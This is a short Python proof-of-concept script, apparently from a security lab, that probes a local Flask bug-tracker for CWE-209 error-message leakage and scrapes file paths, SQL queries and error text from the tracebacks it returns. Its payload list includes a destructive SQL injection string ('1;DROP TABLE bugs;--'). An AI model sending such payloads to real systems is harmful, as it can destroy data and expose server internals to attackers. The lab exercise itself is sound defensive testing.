import re
import textwrap
import requests

BASE_URL = "http://127.0.0.1:5000"

# payloads designed to trigger different kinds of errors / leakage
PAYLOADS = [
    "abc",                       # non-numeric → "no such column"
    "1;DROP TABLE bugs;--",      # looks like SQL injection
    "999999999999999999999",     # huge number → edge-case error
]

def extract_file_paths(html: str):
    """
    try to extract python file paths from the traceback
    example: /Users/nisargbhalani/Desktop/.../routes.py
    """
    path_pattern = r"(/[^ \n]+\.py)"
    return sorted(set(re.findall(path_pattern, html)))

def extract_sql_queries(html: str):
    """
    try to pull out lines that look like SQL queries
    e.g. SELECT id, title, description, created_at FROM bugs WHERE id = abc
    """
    lines = html.splitlines()
    queries = []
    for line in lines:
        if "SELECT" in line.upper() and "FROM" in line.upper():
            # strip HTML tags if any
            cleaned = re.sub(r"<[^>]+>", "", line).strip()
            queries.append(cleaned)
    return queries

def extract_error_messages(html: str):
    """
    pull out the main error message lines from the traceback
    e.g. sqlite3.OperationalError: no such column: abc
    """
    lines = html.splitlines()
    err_lines = [ln.strip() for ln in lines if "Error:" in ln or "sqlite3." in ln]
    # also catch the first <h2>...</h2> line (our e message)
    m = re.search(r"<h2>(.*?)</h2>", html)
    if m:
        err_lines.insert(0, m.group(1).strip())
    return sorted(set(err_lines))

def print_section(title: str, content):
    print(f"\n=== {title} ===")
    if not content:
        print("(none found)")
        return
    if isinstance(content, str):
        print(content)
    else:
        for item in content:
            print(f"- {item}")

def run_exploit():
    print(f"[+] Target base URL: {BASE_URL}")
    print("[+] Starting CWE-209 information leak probe...\n")

    for payload in PAYLOADS:
        url = f"{BASE_URL}/bug/{payload}"
        print("=" * 80)
        print(f"[+] Requesting: {url}")
        try:
            resp = requests.get(url, timeout=5)
        except Exception as e:
            print(f"[!] Request failed: {e}")
            continue

        print(f"[+] HTTP status: {resp.status_code}")

        # show a short preview of the raw response body
        preview = textwrap.shorten(resp.text.replace("\n", " "), width=200, placeholder=" ...")
        print(f"[+] Response preview: {preview}")

        # now do "advanced" extraction
        file_paths = extract_file_paths(resp.text)
        sql_queries = extract_sql_queries(resp.text)
        error_msgs = extract_error_messages(resp.text)

        print_section("Leaked file paths", file_paths)
        print_section("Leaked SQL-like queries", sql_queries)
        print_section("Leaked error messages", error_msgs)

    print("\n[+] Exploit run complete. Review the leaked information above.")
    print("[!] All of this output is data an attacker *should not* see from a production app.")
    

if __name__ == "__main__":
    run_exploit()
